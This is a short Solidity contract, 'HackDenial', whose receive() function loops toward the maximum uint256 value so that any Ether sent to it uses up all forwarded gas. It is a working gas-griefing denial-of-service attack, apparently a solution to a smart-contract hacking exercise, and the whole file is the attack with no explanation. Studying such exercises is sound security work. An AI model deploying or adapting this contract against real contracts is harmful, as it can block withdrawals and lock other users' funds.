pragma solidity ^0.8.0;

contract HackDenial {
    receive() external payable {
        uint ans = 0;
        for (uint i = 0; i < type(uint256).max; i++){
            unchecked {
                ans += i;
            }
        }
    }
}